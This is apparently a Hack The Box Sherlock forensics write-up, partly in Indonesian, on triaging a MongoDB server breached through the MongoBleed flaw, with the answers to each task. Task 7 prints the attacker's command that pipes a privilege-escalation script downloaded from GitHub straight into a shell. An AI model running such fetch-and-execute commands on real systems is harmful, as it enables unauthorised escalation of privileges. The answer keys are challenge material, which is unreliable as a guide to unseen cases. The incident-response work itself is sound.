# 🕵️‍♂️ HTB Sherlock: MangoBleed Write-up

![Category](https://img.shields.io/badge/Category-DFIR-blue?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)

## 📝 Scenario Information
**Sherlock Scenario:**
> You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, `mongodbsync`, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as **MongoBleed**. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

**Objective:**
Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity, and summarize findings.

---

<img width="1427" height="153" alt="image" src="https://github.com/user-attachments/assets/2427bad7-7921-4654-8e9a-814f37d5b036" />

## Download File Untuk Nantinya Menjawab Pertanyaan dan Analisis : 
<img width="1410" height="368" alt="image" src="https://github.com/user-attachments/assets/0282836f-a6c8-4735-ab4f-679b32e35406" />

---
# 🔍 Walkthrough & Analysis

### 1. CVE Identification
**Question:** What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
<img width="1014" height="229" alt="image" src="https://github.com/user-attachments/assets/291a584d-c6f9-454b-b5a5-b82bde7872c2" />

* **Analysis:** Berdasarkan Judulnya MongoBleed CVE yang rentan bisa di search menggunakan Search Engine misal (Google)
<details>
<summary>Click to see answer</summary>

**Answer:** `CVE-2025-14847`
</details>

### 2. Targeted Version
**Question:** What is the version of MongoDB installed on the server that the CVE exploited?
<img width="775" height="61" alt="image" src="https://github.com/user-attachments/assets/4a4dfde3-cd9c-4272-8b8e-a65cd47c929c" />

* **Method:** Check Mongo Log yang ada di `📂uac-mongodbsync-linux-triage/[root]/var/log/mongodb/` setelah di ekstrak, Untuk mendapatkan version bisa menggunakan command berikut : 
    ```bash
    cat mongod.log | grep version
<details>
<summary>Click to see answer</summary>

**Answer:** `8.0.16`
</details>

### Task 3: Attacker IP
**Question:** Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.
<img width="1107" height="349" alt="image" src="https://github.com/user-attachments/assets/2bd5f504-30ef-4af9-bcac-d952cdb9bdad" />

* **Method:** Check IP Address Attacker melalui log mongo.log di direktori `📂uac-mongodbsync-linux-triage/[root]/var/log/mongodb/` bisa menggunakan tools mongobleed detector `https://github.com/Neo23x0/mongobleed-detector` dan menggunakan command berikut : 
 ```bash
    <lokasi tools> -t <jumlahWaktuMundur> --no-default-paths -p mongo.log
    ~/HTB/Sherlock/MongoBleed/mongobleed-detector/mongobleed-detector.sh -t 119420 --no-default-paths -p mongod.log 
```
<details>
<summary>Click to see answer</summary>

**Answer:** `65.0.76.43`
</details>


### Task 4: Exploitation Start Time
**Question:** 
Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
<img width="1024" height="63" alt="image" src="https://github.com/user-attachments/assets/258174cf-1854-48d0-af00-185f08c047d8" />
* **Analysis:** Setelah mengetahui IP Attacker, untuk mengetahui kapan IP Attacker mulai menyerang bisa menggunakan command berikut
```bash
    cat mongod.log | grep 65.0.76.43 | head -10
```
<details>
<summary>Click to see answer</summary>

**Answer:** `2025-12-29 05:25:52`
</details>

### Task 5: Malicious Connections
**Question:** 
Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.
<img width="323" height="32" alt="image" src="https://github.com/user-attachments/assets/df0a36b5-886e-4a27-a5bb-167e54e68e3c" />
* **Method:** Untuk memperkirakan jumlah serangan dari IP Attacker bisa menggunakan command `wc -l`
```bash
    cat mongod.log | grep 65.0.76.43 | wc -l
```
<details>
<summary>Click to see answer</summary>

**Answer:** `75260`
</details>

### Task 6: Remote Access Time
**Question:** 
The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
<img width="1031" height="87" alt="image" src="https://github.com/user-attachments/assets/e0f819d5-4707-4da2-b1b8-e0e85c8ae88b" />
* **Method:** Analisis `auth.log` yang terletak di direktori `/[root]/var/log` untuk mengetahui kapan Attacker bisa mendapatkan remote access setelah melakukan brute force bisa dengan mengunnakan command : 
```bash
    cat auth.log | grep 65.0.76.43
```
<details>
<summary>Click to see answer</summary>
    
**Answer:** `2025-12-29 05:40:03`
</details>

### Task 7: Malicious Command
**Question:** 
Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
<br/><img width="671" height="108" alt="image" src="https://github.com/user-attachments/assets/96c52323-87d9-48f5-b58f-fd0e60ff7877" />
* **Method:** Analisis `.bash_history` yang terletak di direktori `/[root]/home/mongoadmin` untuk mengetahui command apa yang dieksekusi attacker untuk mencoba privillage escalation 
```bash
    cat .bash_history 
```
<details>
<summary>Click to see answer</summary>

**Answer:**
```bash
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
</details>

### Task 8: Locate Directory
**Question:** 
The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
<br/><img width="668" height="285" alt="image" src="https://github.com/user-attachments/assets/d9f795d6-16a5-43fc-b03a-00c18428b003" />
* **Method:** Analisis `.bash_history` yang terletak di direktori `/[root]/home/mongoadmin` untuk mengetahui di direktory mana attacker membuka Python web server
```bash
    cat .bash_history 
```
<details>
<summary>Click to see answer</summary>

**Answer:**
```bash
    /var/lib/mongodb
```
</details>


---
## 🛡️ Incident Summary & Mitigation
The attacker exploited **CVE-2025-14847 (MongoBleed)** to leak memory contents, retrieving credentials which allowed for valid SSH access. Post-compromise, they executed a fileless payload and attempted to exfiltrate the database directory.

**Recommendations:**
1.  **Patch Management:** Update MongoDB to the latest stable version immediately.
2.  **Network Security:** Restrict port 27017 access to trusted internal IPs only.
3.  **Credential Rotation:** Reset all SSH and Database user passwords.

---
*Created for educational purposes.*
